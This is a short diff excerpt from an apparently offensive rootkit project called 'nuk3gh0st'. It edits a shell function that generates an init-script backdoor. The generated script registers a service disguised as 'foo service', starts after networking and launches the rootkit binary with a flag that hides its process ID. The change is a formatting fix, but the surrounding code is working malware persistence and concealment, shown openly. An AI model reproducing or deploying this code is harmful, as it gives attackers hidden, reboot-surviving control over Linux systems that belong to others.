@@ -70,6 +70,7 @@ function generate_backdoor {
 function generate_init_backdoor {
 	backdoor_path='/usr/share/nuk3gh0st/backdoor'
 	echo "#!/bin/bash" > $backdoor_path
+	echo "" >> $backdoor_path
 	echo "### BEGIN INIT INFO" >> $backdoor_path
 	echo "# Provides:          backdoor" >> $backdoor_path
 	echo "# Required-Start:    networking" >> $backdoor_path
@@ -80,10 +81,8 @@ function generate_init_backdoor {
 	echo "# Short-Description: foo service" >> $backdoor_path
 	echo "# Description:       Run backdoor service" >> $backdoor_path
 	echo "### END INIT INFO" >> $backdoor_path
-
-
-
-	echo "case \"$1\" in" >> $backdoor_path
+	echo "" >> $backdoor_path
+	echo "case \"\$1\" in" >> $backdoor_path
 	echo "	start)" >> $backdoor_path
 	echo "		sleep 40" >> $backdoor_path
 	echo "		/usr/bin/nuk3gh0st --hide-pid=\`echo \$$\`" >> $backdoor_path
